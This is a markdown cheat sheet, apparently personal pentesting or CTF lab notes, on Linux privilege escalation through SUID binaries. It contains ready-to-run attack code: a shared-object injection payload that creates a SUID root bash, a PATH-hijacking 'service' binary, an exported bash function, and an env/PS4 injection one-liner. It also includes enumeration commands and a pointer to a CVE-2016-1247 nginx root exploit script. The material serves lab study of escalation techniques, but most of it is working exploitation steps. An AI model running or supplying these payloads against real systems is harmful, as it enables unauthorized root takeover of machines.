# Escalation via SUID

## Enumeration

- `find / -perm -u=s -type f 2>/dev/null`  will list all the files with the suid perm
- You can see the suid perm in the permissions as an `s` like here:  
![image](https://user-images.githubusercontent.com/96747355/167308910-5b0a0157-6586-46bd-a213-42c229e996e8.png)  

## Exploitation

- Here again we can use [GTFOBins](https://gtfobins.github.io/#+suid) and check if our command is in there and has documented exploitation


## Practice

- You see and example of this exploit in [this writeup](../writeups/THM-vulnversity.md)

## SUID - Shared Object Injection

### Enumeration

- `find / -type f -perm -04000 -ls 2>/dev/null` 
- `ls -al nameoffile`

### Exploitation

- In our example the file is `/usr/local/bin/suid-so`
- `strace /usr/local/bin/suid-so 2>&1` with a grep on what could be interesting `strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"` this will show us what happens with the file. This is the place to check if we have rights on one of the file it uses. In our example we will use the file in this output `open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)`
- Once we find a file we can try to overwrite it with a payload to elevate our privileges
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() { 
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
- We make a directory for our file 
- We compile our file `gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c` in my example the file I will overright is `/home/user/.config/libcalc.so`
- This way we just need to run the sid file which is `/usr/local/bin/suid-so` in our example
- And it should give us a root prompt  
![image](https://user-images.githubusercontent.com/96747355/170128114-817d12e9-27bf-429c-9682-6e29222cdcb4.png)  

## SUID - Binary Symlinks

- Issues on log created by nginx

### Enumeration 

- `./linuxexploitsuggester.sh` we should have this output `[+] [CVE-2016-1247] nginxed-root.sh` or we could manually look for this specific vulnerability by checking nginx version `dpkg -l | grep nginx`
- Now we need to check if the suid bit is set on sudo `find / -type f -perm -04000 -ls 2>/dev/null` or `ls -al /usr/bin/sudo`

### Exploitation

- `ls -al /var/log/nginx`
- We will need to create a malicious symlink
- We will use [this](https://github.com/xl7dev/Exploit/blob/master/Nginx/nginxed-root.sh) to do so
- `./nginxed-root.sh /var/log/nginx/error.log`
- When nginx will be restarted, we will be root  
![image](https://user-images.githubusercontent.com/96747355/170131842-3acc1171-23de-4d18-9691-167cf4649cc6.png)  
- Check out [this resource](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html) to learn more about this way to escalate

## SUID - Environmental Variables

### Enumeration 

- `find / -type f -perm -04000 -ls 2>/dev/null` we can then chek for env var with the suid bit activated in our example we have `/usr/local/bin/suid-env` this launches apache using service (we know this by making a strings on the file).  
![image](https://user-images.githubusercontent.com/96747355/170258997-532e61be-117c-4e9f-9ad9-a4e6c0644716.png)  

### Exploitation

- Let's create a malicious service and add it to our path so that it is launched instead of apache
- `echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c`
- `gcc /tmp/service.c -o /tmp/service`
- We now need to change our path `export PATH=/tmp:$PATH`  
![image](https://user-images.githubusercontent.com/96747355/170260619-089f2ad9-71ae-4dea-8283-a40ddbb0e5a7.png)  
- And now we just need to run the binary `/usr/local/bin/suid-env` to escalate to root  
![image](https://user-images.githubusercontent.com/96747355/170260873-6b5fa24d-658b-4ba2-b2a1-f2662a4ba839.png)  

## SUID - Environmental Variables with full path to binary

- `find / -type f -perm -04000 -ls 2>/dev/null` we can then chek for env var with the suid bit activated in our example we have `/usr/local/bin/suid-env2` this launches apache using its full path service (we know this by making a strings on the file).  
![image](https://user-images.githubusercontent.com/96747355/170265161-6ffb4183-13e3-418f-8317-5fb8ba1c1faf.png)  
- `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }` instead of creating a malicious bin we create a malicious function
- `export -f /usr/sbin/service` then we export our function in the path
- `/usr/local/bin/suid-env2` finally we just need to launch the service  
**OR**  
- `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'`

